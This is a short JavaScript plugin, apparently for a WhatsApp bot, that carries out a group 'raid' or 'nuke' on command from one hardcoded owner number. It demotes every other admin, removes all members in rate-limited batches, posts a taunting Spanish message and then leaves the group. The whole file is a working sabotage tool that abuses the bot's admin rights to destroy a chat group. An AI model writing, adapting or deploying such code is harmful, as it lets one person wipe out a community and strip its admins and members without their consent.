let handler = async (m, { conn, participants, isBotAdmin }) => {
    // SOLO el owner puede usar este comando
    if (m.sender !== '584142921488@s.whatsapp.net') return
    if (!m.isGroup) return
    if (!isBotAdmin) return

    const botJid = conn.user.jid

    const admins = participants.filter(p =>
        p.id !== botJid &&
        (p.admin === 'admin' || p.admin === 'superadmin')
    ).map(p => p.id)

    const targets = participants.filter(p =>
        p.id !== botJid
    ).map(p => p.id)

    for (let i = 0; i < admins.length; i += 5) {
        const chunk = admins.slice(i, i + 5)
        await conn.groupParticipantsUpdate(m.chat, chunk, 'demote').catch(() => {})
        await new Promise(resolve => setTimeout(resolve, 850))
    }

    for (let i = 0; i < targets.length; i += 10) {
        const chunk = targets.slice(i, i + 10)
        await conn.groupParticipantsUpdate(m.chat, chunk, 'remove').catch(e => console.error('Error en bloque:', e))
        await new Promise(resolve => setTimeout(resolve, 850))
    }

    await conn.sendMessage(m.chat, {
        text: `No hagan emperrar a perez. Aun pueden disculparse y los ayudare de nuevo. Aprendan a ser mejores admins si hice esto es por algo, chaito`
    }).catch(() => {})
    await new Promise(resolve => setTimeout(resolve, 850))
    await conn.groupLeave(m.chat).catch(() => {})
}

handler.command = /^(raid|limpieza|nuke)$/i
handler.group = true
handler.botAdmin = true
export default handler